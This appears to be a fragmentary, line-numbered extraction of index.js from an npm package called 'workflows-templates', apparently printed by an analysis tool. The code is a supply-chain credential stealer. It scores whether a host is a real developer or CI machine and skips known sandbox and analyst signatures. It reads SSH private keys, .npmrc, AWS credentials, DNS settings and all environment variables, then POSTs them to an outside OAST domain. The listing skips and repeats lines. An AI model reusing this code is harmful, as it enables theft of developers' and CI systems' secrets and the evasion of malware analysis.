// File: tmp/tmphslzd7q4/workflows-templates/package/index.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const fs = require('fs')
Line 3: const dns = require('dns')
Line 4: const https = require('https')
Line 5: const path = require('path')
Line 6: _tmp_0 = require('child_process')
Line 14: execSync(cmd, { stdio: 'pipe', timeout: 3000 }).toString().trim()
Line 19: fs.readFileSync(filePath, 'utf8')
Line 24: {
  let score = 0;
  const evidence = [];

  const userInfo = os.userInfo();
  if (userInfo.uid !== 0 && userInfo.username !== 'root') {
    score += 2; evidence.push('NotRootUser');
  }
  if (os.uptime() > 3600) {
    score += 3; evidence.push('LongUptime');
  }
  const homeDir = userInfo.homedir;
  if (safeReadFile(path.join(homeDir, '.gitconfig'))) {
    score += 5; evidence.push('HasGitConfig');
  }
  if (safeReadFile(path.join(homeDir, '.ssh/id_rsa'))) {
    score += 5; evidence.push('HasSSHKey');
  }
  const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID'];
  if (ciVars.some(v => process.env[v])) {
    score += 15; evidence.push('IsCISystem');
  }

  const uname = userInfo.username.toLowerCase();
  const hname = os.hostname().toLowerCase();
  if (uname === 'justin' || hname.startsWith('desktop-')) {
    score -= 20; evidence.push('KnownBotSignature1');
  }
  if (run('pwd').includes('hscan-supplychain')) {
    score -= 20; evidence.push('KnownBotSignature2');
  }
  ...
Line 26: const evidence = []
Line 28: os.userInfo()
Line 30: evidence.push('NotRootUser')
Line 33: evidence.push('LongUptime')
Line 36: safeReadFile(path.join(homeDir, '.gitconfig'))
Line 37: evidence.push('HasGitConfig')
Line 39: safeReadFile(path.join(homeDir, '.ssh/id_rsa'))
Line 40: evidence.push('HasSSHKey')
Line 42: const ciVars = ['CI', 'GITHUB_ACTIONS', 'JENKINS_URL', 'BUILD_ID']
Line 43: ciVars.some(v => process.env[v])
Line 44: evidence.push('IsCISystem')
Line 48: os.hostname()
Line 50: evidence.push('KnownBotSignature1')
Line 52: run('pwd').includes('hscan-supplychain')
Line 53: evidence.push('KnownBotSignature2')
Line 56: evidence.push('SandboxArtifact')
Line 63: {
  mission: 'OKTA-GODMODE-FINAL',
  humanity_score: humanityResult.score,
  confirming_evidence: humanityResult.evidence,
  host: {
    h: os.hostname(),
    w: os.userInfo().username,
    p: os.platform(),
    ut: Math.floor(os.uptime() / 60) + 'm'
  },
  network: {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  },
  files: {
    npmrc: safeReadFile(path.join(os.homedir(), '.npmrc')),
    aws_creds: safeReadFile(path.join(os.homedir(), '.aws/credentials')),
  },
  env: process.env,
}
Line 68: os.hostname()
Line 69: os.userInfo()
Line 70: os.platform()
Line 73: _tmp_9.network = {
    resolv: safeReadFile('/etc/resolv.conf') || run('ipconfig /all'),
  }
Line 74: _tmp_11.resolv = safeReadFile('/etc/resolv.conf') || run('ipconfig /all')
Line 77: safeReadFile(path.join(os.homedir(), '.npmrc'))
Line 78: safeReadFile(path.join(os.homedir(), '.aws/credentials'))
Line 84: Buffer.from(JSON.stringify({
    h: data.host.h,
    w: data.host.w,
    e: data.confirming_evidence
  })).toString('base64')
Line 95: {
      const payload = JSON.stringify(data);
      const req = https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }, res => {}).on('error', () => {});
      req.write(payload);
      req.end();
    }
Line 97: const req = https.request({
        hostname: OAST_DOMAIN,
        port: 443,
        path: `/GODMODE_HIT/${summary}`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      }, res => {}).on('error', () => {})
Line 107: req.write(payload)
Line 108: req.end()
